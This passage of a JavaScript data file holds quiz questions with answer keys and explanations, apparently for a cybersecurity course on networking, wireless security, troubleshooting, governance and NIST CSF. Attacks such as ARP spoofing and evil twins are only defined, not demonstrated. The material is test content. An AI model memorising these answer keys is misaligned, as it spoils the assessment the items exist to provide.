      { id: "nf-q7-8", question: "What is ARP spoofing?", options: ["A legitimate ARP process", "An attack where a malicious device sends fake ARP replies to associate its MAC with another device's IP", "A method of DNS resolution", "A type of encryption"], correctAnswer: 1, explanation: "ARP spoofing (or poisoning) sends forged ARP replies to map the attacker's MAC to a victim's IP, enabling man-in-the-middle attacks." },
      { id: "nf-q7-9", question: "What type of cable connects two similar devices directly?", options: ["Straight-through", "Crossover", "Rollover/Console", "Fiber optic"], correctAnswer: 1, explanation: "A crossover cable swaps TX/RX pairs to connect similar devices (switch-to-switch, PC-to-PC) directly — though modern devices with Auto-MDIX handle this automatically." },
      { id: "nf-q7-10", question: "What is MAC flooding?", options: ["A legitimate switch operation", "An attack that overwhelms a switch's MAC table, causing it to act like a hub", "A network monitoring technique", "A VLAN configuration method"], correctAnswer: 1, explanation: "MAC flooding sends thousands of fake MAC addresses to fill the switch's CAM table, forcing it to flood all traffic — enabling sniffing of network data." },
      { id: "nf-q7-11", question: "Which cable type supports the longest distance runs?", options: ["Cat5e", "Cat6", "Fiber optic", "Coaxial"], correctAnswer: 2, explanation: "Fiber optic cables support much longer distances (up to 80+ km for single-mode) compared to copper (max 100m), with no electromagnetic interference." },
      { id: "nf-q7-12", question: "What is the maximum cable length for Cat6 Ethernet?", options: ["50 meters", "100 meters", "200 meters", "1000 meters"], correctAnswer: 1, explanation: "Cat6 copper Ethernet cables have a maximum segment length of 100 meters (328 feet) for reliable data transmission." },
      { id: "nf-q7-13", question: "What is the difference between single-mode and multi-mode fiber?", options: ["They carry the same signals", "Single-mode uses a smaller core for longer distances; multi-mode uses a larger core for shorter distances", "Multi-mode is always faster", "Single-mode is cheaper"], correctAnswer: 1, explanation: "Single-mode fiber has a small core (~9μm), allowing one light path for long distances. Multi-mode has a larger core (~50-62.5μm) for shorter distances." },
      { id: "nf-q7-14", question: "What switching method examines the entire frame before forwarding?", options: ["Cut-through", "Store-and-forward", "Fragment-free", "Adaptive"], correctAnswer: 1, explanation: "Store-and-forward switching receives the entire frame, checks the FCS for errors, then forwards it — providing the highest error checking at slightly higher latency." },
      { id: "nf-q7-15", question: "What is port security on a switch?", options: ["A firewall feature", "A feature that limits the number of MAC addresses allowed on a port, preventing unauthorized access", "A routing protocol", "A DNS security feature"], correctAnswer: 1, explanation: "Port security restricts the number of valid MAC addresses on a switch port, helping prevent MAC flooding attacks and unauthorized device connections." }
    ]
  },
  {
    quizId: "nf-q8",
    courseId: "network-fundamentals",
    title: "Wireless Networking Quiz",
    description: "Validate wireless standards, security protocols, and threat knowledge.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      { id: "nf-q8-1", question: "Which wireless standard is known as Wi-Fi 6?", options: ["802.11n", "802.11ac", "802.11ax", "802.11g"], correctAnswer: 2, explanation: "802.11ax is Wi-Fi 6 — it provides improved performance in dense environments with features like OFDMA, MU-MIMO, and target wake time." },
      { id: "nf-q8-2", question: "What are the two common Wi-Fi frequency bands?", options: ["1 GHz and 3 GHz", "2.4 GHz and 5 GHz", "900 MHz and 1800 MHz", "3.5 GHz and 7 GHz"], correctAnswer: 1, explanation: "Wi-Fi primarily uses 2.4 GHz (longer range, more interference) and 5 GHz (shorter range, faster speeds, less interference)." },
      { id: "nf-q8-3", question: "Which wireless security protocol should NOT be used due to known vulnerabilities?", options: ["WPA3", "WPA2-Enterprise", "WEP", "WPA2-PSK with AES"], correctAnswer: 2, explanation: "WEP (Wired Equivalent Privacy) has critical vulnerabilities — its RC4 encryption can be cracked in minutes. Always use WPA2 or WPA3." },
      { id: "nf-q8-4", question: "What is the main improvement of WPA3 over WPA2?", options: ["Faster speeds", "SAE (Simultaneous Authentication of Equals) replacing PSK, providing forward secrecy", "Better range", "More channels"], correctAnswer: 1, explanation: "WPA3 introduces SAE (dragonfly handshake) replacing the PSK 4-way handshake, providing forward secrecy and resistance to offline dictionary attacks." },
      { id: "nf-q8-5", question: "What is an evil twin attack?", options: ["A dual-band router setup", "A rogue access point mimicking a legitimate network's SSID to capture user traffic", "A VLAN misconfiguration", "A firmware update attack"], correctAnswer: 1, explanation: "An evil twin is a malicious AP with the same SSID as a legitimate network — victims connect to it unknowingly, allowing the attacker to intercept all traffic." },
      { id: "nf-q8-6", question: "What does 802.1X provide in wireless networking?", options: ["Faster speeds", "Port-based network access control with RADIUS authentication", "Longer range", "Better encryption"], correctAnswer: 1, explanation: "802.1X provides enterprise authentication — requiring users to authenticate through a RADIUS server before gaining network access." },
      { id: "nf-q8-7", question: "What is SSID?", options: ["A security protocol", "The name that identifies a wireless network", "A type of encryption", "A frequency band"], correctAnswer: 1, explanation: "SSID (Service Set Identifier) is the human-readable name of a wireless network that devices see when scanning for available networks." },
      { id: "nf-q8-8", question: "What is a deauthentication attack?", options: ["A legitimate logout process", "Sending forged deauth frames to disconnect clients from an AP, often as a precursor to other attacks", "A firewall feature", "An encryption standard"], correctAnswer: 1, explanation: "Deauth attacks send spoofed deauthentication frames to force clients off the network — often used before evil twin attacks or to capture WPA handshakes." },
      { id: "nf-q8-9", question: "What is the advantage of 5 GHz over 2.4 GHz?", options: ["Longer range", "More available channels and less interference, providing faster speeds", "Better wall penetration", "Lower power consumption"], correctAnswer: 1, explanation: "5 GHz offers more non-overlapping channels and less interference (fewer devices use it), enabling faster speeds — though with shorter range." },
      { id: "nf-q8-10", question: "What is a rogue access point?", options: ["A backup AP", "An unauthorized AP connected to the network, creating a security vulnerability", "A guest network AP", "A mesh network node"], correctAnswer: 1, explanation: "A rogue AP is an unauthorized access point connected to the corporate network — it bypasses security controls and can provide backdoor access." },
      { id: "nf-q8-11", question: "What encryption algorithm does WPA2 use?", options: ["RC4", "DES", "AES-CCMP", "3DES"], correctAnswer: 2, explanation: "WPA2 uses AES-CCMP (Advanced Encryption Standard with Counter Mode CBC-MAC Protocol) for robust encryption." },
      { id: "nf-q8-12", question: "What is MU-MIMO?", options: ["A security protocol", "Multi-User Multiple-Input Multiple-Output — allows simultaneous communication with multiple devices", "A frequency band", "An antenna type"], correctAnswer: 1, explanation: "MU-MIMO enables an AP to communicate with multiple devices simultaneously rather than sequentially, improving throughput in dense environments." },
      { id: "nf-q8-13", question: "What is war driving?", options: ["A network speed test", "Driving around to discover and map wireless networks using scanning tools", "A type of DDoS attack", "A routing protocol"], correctAnswer: 1, explanation: "War driving involves physically moving through an area with wireless scanning tools to discover, map, and potentially exploit wireless networks." },
      { id: "nf-q8-14", question: "What does WPA stand for?", options: ["Wireless Protocol Access", "Wi-Fi Protected Access", "Wired Protocol Authentication", "Wireless Public Access"], correctAnswer: 1, explanation: "WPA stands for Wi-Fi Protected Access — the security standard developed by the Wi-Fi Alliance to replace the insecure WEP protocol." },
      { id: "nf-q8-15", question: "What is the purpose of a wireless IDS/IPS?", options: ["Speed optimization", "Detecting and preventing wireless attacks like rogue APs, deauth attacks, and unauthorized clients", "Channel management", "SSID broadcast"], correctAnswer: 1, explanation: "Wireless IDS/IPS monitors the RF spectrum for malicious activity — detecting rogue APs, evil twins, deauth attacks, and policy violations." }
    ]
  },
  {
    quizId: "nf-q9",
    courseId: "network-fundamentals",
    title: "Network Troubleshooting Quiz",
    description: "Assess your ability to use network diagnostic tools and methodologies.",
    passingScore: 75,
    timeLimit: 20,
    questions: [
      { id: "nf-q9-1", question: "What is the first step in a structured troubleshooting methodology?", options: ["Implement a solution", "Identify the problem and gather information", "Test a theory", "Document findings"], correctAnswer: 1, explanation: "The first step is always identifying the problem — gathering symptoms, affected users, recent changes, and scope before forming theories." },
      { id: "nf-q9-2", question: "What does the `ping` command test?", options: ["DNS resolution only", "Basic connectivity and round-trip time to a destination using ICMP", "Port availability", "Bandwidth speed"], correctAnswer: 1, explanation: "Ping sends ICMP echo requests and measures reply times, testing basic IP connectivity, latency, and packet loss to a target host." },
      { id: "nf-q9-3", question: "What does `traceroute` (or `tracert` on Windows) show?", options: ["Open ports on a host", "The path packets take through the network, showing each hop and latency", "DNS records", "MAC addresses"], correctAnswer: 1, explanation: "Traceroute maps the network path by sending packets with incrementing TTL values, revealing each router hop and its response time." },
      { id: "nf-q9-4", question: "Which command displays active network connections and listening ports?", options: ["ping", "traceroute", "netstat / ss", "nslookup"], correctAnswer: 2, explanation: "Netstat (or ss on modern Linux) shows active TCP/UDP connections, listening ports, and associated process IDs." },
      { id: "nf-q9-5", question: "What tool is used for deep packet analysis and capture?", options: ["ping", "nslookup", "Wireshark", "ipconfig"], correctAnswer: 2, explanation: "Wireshark is a packet analyzer that captures and inspects network traffic in real-time, allowing detailed protocol analysis." },
      { id: "nf-q9-6", question: "If you can ping an IP address but not a hostname, what is likely the issue?", options: ["Network cable problem", "DNS resolution failure", "Firewall blocking ICMP", "IP address conflict"], correctAnswer: 1, explanation: "If IP connectivity works but name resolution fails, the issue is with DNS — check DNS server settings, DNS service availability, and records." },
      { id: "nf-q9-7", question: "What does `nslookup` do?", options: ["Tests connectivity", "Queries DNS servers to resolve domain names or look up DNS records", "Shows routing table", "Displays ARP cache"], correctAnswer: 1, explanation: "Nslookup queries DNS servers to resolve hostnames to IPs, look up specific record types (MX, CNAME), and troubleshoot DNS issues." },
      { id: "nf-q9-8", question: "What Wireshark display filter shows only HTTP traffic?", options: ["tcp.port == 80", "http", "ip.proto == http", "filter http"], correctAnswer: 1, explanation: "The display filter 'http' shows only HTTP protocol traffic. You can also use 'tcp.port == 80' but 'http' is more precise for parsed HTTP data." },
      { id: "nf-q9-9", question: "What does `arp -a` show?", options: ["DNS cache", "The ARP cache — mappings of IP addresses to MAC addresses", "Routing table", "Open ports"], correctAnswer: 1, explanation: "The `arp -a` command displays the ARP cache — showing known IP-to-MAC address mappings for devices on the local network." },
      { id: "nf-q9-10", question: "You notice high latency on hop 3 of a traceroute but normal latency on hop 4. What does this suggest?", options: ["Hop 3 has a problem", "Hop 3's router deprioritizes ICMP responses — this is likely normal", "The network is overloaded", "Your DNS is failing"], correctAnswer: 1, explanation: "Many routers deprioritize ICMP responses. If subsequent hops show normal latency, hop 3 is likely rate-limiting ICMP, not actually congested." },
      { id: "nf-q9-11", question: "What command shows the IP configuration on Windows?", options: ["ifconfig", "ipconfig", "ip addr", "netstat"], correctAnswer: 1, explanation: "On Windows, `ipconfig` (or `ipconfig /all` for detailed info) shows IP address, subnet mask, default gateway, and DNS settings." },
      { id: "nf-q9-12", question: "What is the purpose of `ipconfig /flushdns`?", options: ["Reset network adapter", "Clear the local DNS resolver cache to force fresh DNS lookups", "Release the IP address", "Display routing table"], correctAnswer: 1, explanation: "Flushing DNS clears cached DNS records — useful when a domain's IP has changed and your system is still using the old cached record." },
      { id: "nf-q9-13", question: "What does the `pathping` command combine?", options: ["ping and ARP", "The functionality of ping and traceroute, showing path and packet loss statistics", "DNS and DHCP queries", "Netstat and route"], correctAnswer: 1, explanation: "Pathping combines traceroute (path discovery) with extended ping statistics, showing packet loss and latency at each hop over time." },
      { id: "nf-q9-14", question: "If a user has a 169.254.x.x IP address, what should you check?", options: ["DNS settings", "DHCP server availability — the client failed to obtain an IP address", "Firewall rules", "Proxy settings"], correctAnswer: 1, explanation: "169.254.x.x (APIPA) means the DHCP client couldn't reach a DHCP server — check DHCP service, network connectivity, and DHCP scope availability." },
      { id: "nf-q9-15", question: "What is the bottom-up troubleshooting approach?", options: ["Start at the application layer", "Start at the physical layer and work up through the OSI model", "Start with DNS", "Start by rebooting everything"], correctAnswer: 1, explanation: "Bottom-up starts at Layer 1 (Physical) — check cables, link lights, then Layer 2 (MAC/switching), Layer 3 (IP), and so on up the stack." }
    ]
  },
  {
    quizId: "nf-q10",
    courseId: "network-fundamentals",
    title: "Network Fundamentals Certification Exam",
    description: "Comprehensive final exam covering all 10 modules. Pass with 80% to earn your certificate.",
    passingScore: 80,
    timeLimit: 60,
    questions: [
      { id: "nf-q10-1", question: "Which OSI layer is responsible for logical addressing and routing?", options: ["Layer 2 — Data Link", "Layer 3 — Network", "Layer 4 — Transport", "Layer 5 — Session"], correctAnswer: 1, explanation: "Layer 3 (Network) handles logical addressing (IP addresses) and routing packets between different networks." },
      { id: "nf-q10-2", question: "What is the three-way handshake sequence in TCP?", options: ["ACK, SYN, FIN", "SYN, SYN-ACK, ACK", "FIN, ACK, RST", "SYN, ACK, FIN"], correctAnswer: 1, explanation: "TCP connection establishment: Client sends SYN → Server responds SYN-ACK → Client sends ACK. Connection is now established." },
      { id: "nf-q10-3", question: "How many usable host addresses exist in a /26 subnet?", options: ["30", "62", "64", "126"], correctAnswer: 1, explanation: "/26 = 6 host bits = 2^6 = 64 addresses. Minus network and broadcast = 62 usable host addresses." },
      { id: "nf-q10-4", question: "What protocol resolves IP addresses to MAC addresses?", options: ["DNS", "DHCP", "ARP", "ICMP"], correctAnswer: 2, explanation: "ARP (Address Resolution Protocol) resolves a known IP address to its corresponding MAC address on the local network segment." },
      { id: "nf-q10-5", question: "A switch floods a frame when:", options: ["The destination MAC is in its CAM table", "The destination MAC is unknown (not in the MAC address table)", "The frame has errors", "The VLAN is misconfigured"], correctAnswer: 1, explanation: "When a switch receives a frame with a destination MAC not in its table, it floods the frame out all ports except the source — this is unknown unicast flooding." },
      { id: "nf-q10-6", question: "Which wireless security protocol provides SAE (Simultaneous Authentication of Equals)?", options: ["WEP", "WPA", "WPA2", "WPA3"], correctAnswer: 3, explanation: "WPA3 introduces SAE, which replaces PSK with a more secure dragonfly handshake, providing forward secrecy and resistance to offline attacks." },
      { id: "nf-q10-7", question: "What is the default port for HTTPS?", options: ["80", "8080", "443", "8443"], correctAnswer: 2, explanation: "HTTPS uses port 443 by default for encrypted web communication over TLS/SSL." },
      { id: "nf-q10-8", question: "In the DHCP DORA process, what does the 'O' stand for?", options: ["Open", "Offer", "Obtain", "Operate"], correctAnswer: 1, explanation: "DORA: Discover, Offer, Request, Acknowledge. The DHCP server sends an Offer containing an available IP address to the requesting client." },
      { id: "nf-q10-9", question: "What is the purpose of Spanning Tree Protocol (STP)?", options: ["VLAN creation", "Preventing Layer 2 loops in redundant switch topologies", "DNS resolution", "IP address assignment"], correctAnswer: 1, explanation: "STP prevents broadcast storms by logically disabling redundant switch paths while maintaining them as backup for failover." },
      { id: "nf-q10-10", question: "Which command would you use to view the routing table on a Linux system?", options: ["arp -a", "ip route / route -n", "ipconfig /all", "nslookup"], correctAnswer: 1, explanation: "On Linux, `ip route` (or the older `route -n`) displays the kernel routing table showing destination networks, gateways, and interfaces." },
      { id: "nf-q10-11", question: "What is the broadcast address for 172.16.50.0/23?", options: ["172.16.50.255", "172.16.51.255", "172.16.52.0", "172.16.50.1"], correctAnswer: 1, explanation: "/23 means the network spans 172.16.50.0 – 172.16.51.255. The broadcast address is the last address: 172.16.51.255." },
      { id: "nf-q10-12", question: "What makes UDP suitable for real-time applications like VoIP?", options: ["Built-in encryption", "No connection overhead and no retransmission delays, providing lower latency", "Better security", "Guaranteed delivery"], correctAnswer: 1, explanation: "UDP's connectionless nature means no handshake delay and no retransmission — slightly lost packets are preferable to delayed audio/video." },
      { id: "nf-q10-13", question: "Which DNS record type creates an alias for another domain name?", options: ["A", "MX", "CNAME", "AAAA"], correctAnswer: 2, explanation: "CNAME (Canonical Name) creates an alias that points one domain to another — e.g., www.example.com → example.com." },
      { id: "nf-q10-14", question: "What is 802.1Q used for?", options: ["Wireless authentication", "VLAN tagging on trunk links between switches", "Port security", "Spanning tree"], correctAnswer: 1, explanation: "IEEE 802.1Q inserts a 4-byte VLAN tag into Ethernet frames, allowing trunk links to carry traffic for multiple VLANs." },
      { id: "nf-q10-15", question: "What is the difference between static and dynamic routing?", options: ["Static is always faster", "Static requires manual configuration; dynamic uses protocols (OSPF, BGP) to automatically learn routes", "Dynamic is less reliable", "They are identical"], correctAnswer: 1, explanation: "Static routes are manually configured by admins. Dynamic routing uses protocols like OSPF and BGP to automatically discover and adapt routes." },
      { id: "nf-q10-16", question: "An evil twin attack targets which technology?", options: ["Wired Ethernet", "Wireless networks by creating a fake AP with the same SSID", "DNS servers", "DHCP servers"], correctAnswer: 1, explanation: "Evil twin attacks create a rogue AP mimicking a legitimate wireless network's SSID to trick users into connecting and intercepting their traffic." },
      { id: "nf-q10-17", question: "What does NAT (Network Address Translation) do?", options: ["Encrypts data", "Translates private IP addresses to public IP addresses for internet access", "Resolves DNS names", "Assigns DHCP leases"], correctAnswer: 1, explanation: "NAT translates private RFC 1918 addresses to public IPs, allowing multiple internal devices to share one or more public IP addresses." },
      { id: "nf-q10-18", question: "What is the maximum segment length for Cat6 Ethernet cable?", options: ["50 meters", "100 meters", "200 meters", "500 meters"], correctAnswer: 1, explanation: "All standard Ethernet copper cables (Cat5e, Cat6, Cat6a) have a maximum segment length of 100 meters (328 feet)." },
      { id: "nf-q10-19", question: "Which tool shows the path packets take through a network?", options: ["ping", "traceroute / tracert", "nslookup", "netstat"], correctAnswer: 1, explanation: "Traceroute (tracert on Windows) shows each hop along the path to a destination, revealing routers and their response times." },
      { id: "nf-q10-20", question: "What is a VLAN's primary security benefit?", options: ["Encryption", "Network segmentation — isolating broadcast domains to limit attack scope", "Firewall replacement", "Authentication"], correctAnswer: 1, explanation: "VLANs segment the network into isolated broadcast domains, limiting the scope of broadcasts and containing lateral movement during attacks." },
      { id: "nf-q10-21", question: "IPv6 addresses are how many bits long?", options: ["32", "64", "96", "128"], correctAnswer: 3, explanation: "IPv6 addresses are 128 bits, providing approximately 3.4 × 10^38 unique addresses — solving IPv4 address exhaustion." },
      { id: "nf-q10-22", question: "What is the purpose of a default gateway?", options: ["DNS resolution", "Forwards traffic to destinations outside the local subnet", "DHCP assignment", "MAC learning"], correctAnswer: 1, explanation: "The default gateway (typically a router) forwards packets when the destination IP is not on the local subnet — it's the exit point for the LAN." },
      { id: "nf-q10-23", question: "Which Wireshark feature lets you follow an entire TCP conversation?", options: ["Display filter", "Follow TCP Stream", "Capture filter", "Protocol hierarchy"], correctAnswer: 1, explanation: "Follow TCP Stream reconstructs and displays the complete data exchange of a TCP session, making it easy to read application-layer conversations." },
      { id: "nf-q10-24", question: "What is MAC flooding?", options: ["A legitimate switch feature", "An attack that overwhelms a switch's MAC table, causing it to broadcast all traffic like a hub", "A firmware update", "A VLAN configuration method"], correctAnswer: 1, explanation: "MAC flooding fills the switch's CAM table with fake entries, causing the switch to fail-open and flood all frames to all ports — enabling traffic sniffing." },
      { id: "nf-q10-25", question: "What is the difference between single-mode and multi-mode fiber?", options: ["Same technology, different colors", "Single-mode: smaller core, longer distance, laser; Multi-mode: larger core, shorter distance, LED", "Multi-mode is always faster", "Single-mode is only for LANs"], correctAnswer: 1, explanation: "Single-mode (~9μm core) uses laser for long distances (up to 80+ km). Multi-mode (~50-62.5μm) uses LED for shorter distances (up to ~2 km)." },
      { id: "nf-q10-26", question: "What port does SSH use by default?", options: ["20", "22", "23", "25"], correctAnswer: 1, explanation: "SSH uses port 22 for secure, encrypted remote access — replacing insecure Telnet (port 23)." },
      { id: "nf-q10-27", question: "What is CIDR notation /16 equivalent to in dotted decimal?", options: ["255.0.0.0", "255.255.0.0", "255.255.255.0", "255.255.255.128"], correctAnswer: 1, explanation: "/16 means 16 network bits are set to 1: 11111111.11111111.00000000.00000000 = 255.255.0.0." },
      { id: "nf-q10-28", question: "Which protocol provides encrypted remote file transfer?", options: ["FTP", "TFTP", "SFTP/SCP", "Telnet"], correctAnswer: 2, explanation: "SFTP (SSH File Transfer Protocol) and SCP (Secure Copy) provide encrypted file transfer over SSH, unlike FTP which sends data in cleartext." },
      { id: "nf-q10-29", question: "What is Zero Trust networking?", options: ["No security at all", "A model where no user or device is trusted by default — every access request must be verified", "A wireless-only concept", "An outdated security model"], correctAnswer: 1, explanation: "Zero Trust assumes no implicit trust — every user, device, and connection must be continuously verified regardless of location (internal or external)." },
      { id: "nf-q10-30", question: "A user can ping their default gateway but cannot access external websites. What should you check next?", options: ["Replace the Ethernet cable", "DNS resolution and upstream routing — the local network works but internet access or name resolution may be failing", "Reinstall the OS", "Change the MAC address"], correctAnswer: 1, explanation: "Since local connectivity works (gateway is reachable), check DNS settings (try pinging 8.8.8.8 by IP), upstream router connectivity, and ISP status." }
    ]
  },
  // =============================================
  // CYBERSECURITY FRAMEWORKS COURSE QUIZZES
  // =============================================
  {
    quizId: "cf-q1",
    courseId: "cybersecurity-frameworks",
    title: "Cybersecurity Governance Quiz",
    description: "Test your understanding of governance principles, GRC, and security policies.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      { id: "cf-q1-1", question: "What is the primary purpose of cybersecurity governance?", options: ["To install firewalls and antivirus", "To align security strategy with business objectives", "To write code for security tools", "To monitor network traffic"], correctAnswer: 1, explanation: "Cybersecurity governance ensures that security efforts are strategically aligned with and support the organization's business goals." },
      { id: "cf-q1-2", question: "Who holds ultimate accountability for cybersecurity risk in an organization?", options: ["The CISO", "The IT help desk", "The Board of Directors", "The SOC analyst"], correctAnswer: 2, explanation: "The Board of Directors holds ultimate fiduciary responsibility for cybersecurity risk oversight." },
      { id: "cf-q1-3", question: "What does GRC stand for?", options: ["General Risk Criteria", "Governance, Risk, and Compliance", "Global Regulatory Controls", "Guided Response Coordination"], correctAnswer: 1, explanation: "GRC stands for Governance, Risk, and Compliance — three interconnected disciplines for managing organizational risk." },
      { id: "cf-q1-4", question: "Which document type is mandatory and approved by senior management?", options: ["Guidelines", "Procedures", "Policies", "Recommendations"], correctAnswer: 2, explanation: "Policies are high-level, mandatory statements approved by senior management that set the direction for security." },
      { id: "cf-q1-5", question: "What is the difference between risk appetite and risk tolerance?", options: ["They are identical terms", "Appetite is overall willingness to accept risk; tolerance is acceptable deviation", "Tolerance is higher than appetite", "Appetite applies only to financial risk"], correctAnswer: 1, explanation: "Risk appetite is the overall level of risk an organization is willing to accept, while risk tolerance is the acceptable deviation from that appetite." },
      { id: "cf-q1-6", question: "Why should the CISO NOT report to the CIO?", options: ["CISOs don't need to report to anyone", "It creates a potential conflict of interest between IT and security", "CIOs are not qualified to oversee security", "It violates GDPR requirements"], correctAnswer: 1, explanation: "When the CISO reports to the CIO, there's a conflict of interest — the CIO may prioritize IT speed over security, undermining independent oversight." },
      { id: "cf-q1-7", question: "What role is mandatory under GDPR for certain organizations?", options: ["Chief Technology Officer", "Data Protection Officer (DPO)", "Security Operations Manager", "Risk Analyst"], correctAnswer: 1, explanation: "GDPR requires a Data Protection Officer for organizations that systematically monitor individuals or process special category data at scale." },
      { id: "cf-q1-8", question: "What is the correct documentation hierarchy from highest to lowest?", options: ["Procedures → Standards → Policies → Guidelines", "Guidelines → Procedures → Standards → Policies", "Policies → Standards → Procedures → Guidelines", "Standards → Policies → Guidelines → Procedures"], correctAnswer: 2, explanation: "The hierarchy is Policies (what) → Standards (how specifically) → Procedures (step-by-step) → Guidelines (recommendations)." },
      { id: "cf-q1-9", question: "What is a Security Steering Committee?", options: ["A group that writes all security code", "A cross-functional body providing governance oversight", "An external auditing firm", "A vendor management team"], correctAnswer: 1, explanation: "A Security Steering Committee is a cross-functional governance body that includes the CISO, CIO, legal, HR, and business leaders for security oversight." },
      { id: "cf-q1-10", question: "Which statement about compliance is correct?", options: ["Compliance guarantees security", "Compliance is the ceiling of security", "You can be compliant and still insecure", "Compliance is optional for all organizations"], correctAnswer: 2, explanation: "Compliance provides a baseline (the floor), but organizations can be fully compliant with a standard and still have security gaps." },
      { id: "cf-q1-11", question: "What should an effective security policy include?", options: ["Only technical configurations", "Purpose, scope, policy statements, roles, enforcement, and review history", "Just a list of prohibited activities", "Employee salaries and benefits"], correctAnswer: 1, explanation: "Effective policies include purpose, scope, policy statements, roles & responsibilities, enforcement, related documents, and review history." },
      { id: "cf-q1-12", question: "How often should security policies be reviewed at minimum?", options: ["Every 5 years", "Only after a breach", "Annually", "Monthly"], correctAnswer: 2, explanation: "Security policies should be reviewed at minimum annually, or whenever significant changes occur in the threat landscape or business environment." },
      { id: "cf-q1-13", question: "What is the difference between a Risk Owner and a Control Owner?", options: ["They are the same role", "Risk Owner is accountable for the risk; Control Owner implements and maintains the control", "Control Owner has more authority than Risk Owner", "Risk Owner only works during incidents"], correctAnswer: 1, explanation: "The Risk Owner (typically a business leader) is accountable for a specific risk, while the Control Owner (technical lead) implements and maintains the control." },
      { id: "cf-q1-14", question: "Which GRC platform is designed for continuous compliance monitoring?", options: ["Microsoft Word", "Drata or Vanta", "Slack", "Jira"], correctAnswer: 1, explanation: "Platforms like Drata and Vanta are designed for continuous compliance monitoring, automated evidence collection, and audit readiness." },
      { id: "cf-q1-15", question: "What is the biggest benefit of integrated GRC?", options: ["It eliminates all security risks", "It provides a single source of truth for controls and risks with unified reporting", "It replaces the need for a security team", "It automatically fixes all vulnerabilities"], correctAnswer: 1, explanation: "Integrated GRC provides a single source of truth, unified reporting to leadership, and efficient use of resources across governance, risk, and compliance." }
    ]
  },
  {
    quizId: "cf-q2",
    courseId: "cybersecurity-frameworks",
    title: "NIST CSF Assessment",
    description: "Evaluate your knowledge of the NIST Cybersecurity Framework functions and tiers.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      { id: "cf-q2-1", question: "How many core functions does NIST CSF v2.0 have?", options: ["4", "5", "6", "7"], correctAnswer: 2, explanation: "NIST CSF v2.0 has 6 core functions: Govern, Identify, Protect, Detect, Respond, and Recover." },
      { id: "cf-q2-2", question: "Which function was added in NIST CSF v2.0?", options: ["Detect", "Protect", "Govern", "Recover"], correctAnswer: 2, explanation: "The Govern (GV) function was added in v2.0 to address organizational context, risk strategy, and supply chain risk management." },
      { id: "cf-q2-3", question: "What year was the original NIST CSF released?", options: ["2010", "2014", "2018", "2020"], correctAnswer: 1, explanation: "NIST CSF v1.0 was released in February 2014 following Executive Order 13636 in 2013." },
      { id: "cf-q2-4", question: "What is a NIST CSF Profile?", options: ["A user account", "An alignment of CSF outcomes with business needs and risk tolerance", "A firewall configuration", "A type of encryption"], correctAnswer: 1, explanation: "A Profile represents an organization's alignment with CSF Core based on business needs, risk tolerance, and resources." },
      { id: "cf-q2-5", question: "What does Tier 3 (Repeatable) indicate?", options: ["No formal processes", "Ad hoc risk management", "Formally approved, organization-wide risk management practices", "Continuous, adaptive risk management"], correctAnswer: 2, explanation: "Tier 3 means risk management practices are formally approved and expressed as policy, with an organization-wide approach." },
      { id: "cf-q2-6", question: "Which CSF function focuses on safeguards like MFA and encryption?", options: ["Identify", "Protect", "Detect", "Recover"], correctAnswer: 1, explanation: "The Protect (PR) function implements safeguards including access control, data security, training, and platform security." },
      { id: "cf-q2-7", question: "Is NIST CSF mandatory for private sector organizations?", options: ["Yes, it's required by federal law", "No, it's a voluntary, risk-based framework", "Only for organizations with >1000 employees", "Only for healthcare organizations"], correctAnswer: 1, explanation: "NIST CSF is voluntary for private sector organizations, though many regulators and partners expect or require its adoption." },
      { id: "cf-q2-8", question: "What is the purpose of a gap analysis in NIST CSF?", options: ["To find software bugs", "To compare current and target profiles to prioritize improvements", "To test network speed", "To hire new staff"], correctAnswer: 1, explanation: "Gap analysis compares the Current Profile to the Target Profile, revealing areas needing improvement and guiding investment priorities." },
      { id: "cf-q2-9", question: "Which function covers incident management and response?", options: ["Identify", "Protect", "Respond", "Govern"], correctAnswer: 2, explanation: "The Respond (RS) function covers incident management, analysis, communication, and mitigation actions." },
      { id: "cf-q2-10", question: "What is the first step in implementing NIST CSF?", options: ["Deploy a SIEM", "Secure executive buy-in", "Hire a SOC team", "Purchase cyber insurance"], correctAnswer: 1, explanation: "The first step is securing executive buy-in — presenting the business case for CSF adoption and assigning a project sponsor." },
      { id: "cf-q2-11", question: "Does every organization need to reach Tier 4?", options: ["Yes, all organizations must reach Tier 4", "No, the right tier depends on organizational risk and resources", "Only government agencies need Tier 4", "Tier 4 doesn't exist"], correctAnswer: 1, explanation: "Tiers are not maturity levels that every organization must climb. The appropriate tier depends on risk, regulatory requirements, and resources." },
      { id: "cf-q2-12", question: "What does the Identify function focus on?", options: ["Encrypting data", "Understanding assets, risks, and improvement opportunities", "Restoring services after an incident", "Automating security workflows"], correctAnswer: 1, explanation: "The Identify (ID) function develops organizational understanding of cybersecurity risk to systems, people, assets, and data." },
      { id: "cf-q2-13", question: "Which CSF function covers business continuity and disaster recovery?", options: ["Protect", "Detect", "Respond", "Recover"], correctAnswer: 3, explanation: "The Recover (RC) function covers restoring capabilities and services impaired by cybersecurity incidents." },
      { id: "cf-q2-14", question: "What common implementation mistake should be avoided?", options: ["Starting with executive buy-in", "Treating CSF as a checkbox exercise rather than risk-based approach", "Conducting gap analysis", "Creating profiles"], correctAnswer: 1, explanation: "Treating CSF as a checkbox exercise misses the point — it's a risk-based framework, not a compliance checklist." },
      { id: "cf-q2-15", question: "NIST CSF maps to which other frameworks?", options: ["Only ISO 27001", "Only CIS Controls", "ISO 27001, CIS Controls, COBIT, and many others", "No other frameworks"], correctAnswer: 2, explanation: "NIST CSF is designed to be integrative and maps to ISO 27001, CIS Controls, COBIT, PCI-DSS, and many other frameworks." }
    ]
  },
  {
    quizId: "cf-q3",
    courseId: "cybersecurity-frameworks",
    title: "ISO 27001 Quiz",
    description: "Assess your understanding of ISMS, Annex A controls, and the certification process.",
    passingScore: 75,
    timeLimit: 20,
    questions: [
      { id: "cf-q3-1", question: "What does ISMS stand for?", options: ["Internet Security Management System", "Information Security Management System", "Integrated Security Monitoring Service", "Information System Maintenance Standard"], correctAnswer: 1, explanation: "ISMS stands for Information Security Management System — a systematic approach to managing sensitive information." },
      { id: "cf-q3-2", question: "How many controls are in ISO 27001:2022 Annex A?", options: ["114", "93", "42", "200"], correctAnswer: 1, explanation: "ISO 27001:2022 reorganized controls into 93 controls across 4 themes, down from 114 in the 2013 version." },
